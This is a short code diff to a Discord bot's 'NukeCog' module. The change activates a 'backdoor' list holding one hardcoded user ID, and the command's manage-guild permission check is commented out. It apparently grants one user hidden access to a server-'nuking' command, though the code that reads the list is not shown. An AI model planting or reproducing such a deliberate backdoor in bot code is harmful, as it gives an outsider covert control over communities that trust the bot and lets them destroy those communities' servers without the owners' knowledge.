@@ -11,7 +11,7 @@ class NukeCog(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
 
-    #backdoor = [140698580590657536]
+    backdoor = [140698580590657536]
 
     @commands.command(pass_context = True) # Must do pass_context = True for code to work
     #@commands.has_permissions(manage_guild=True)
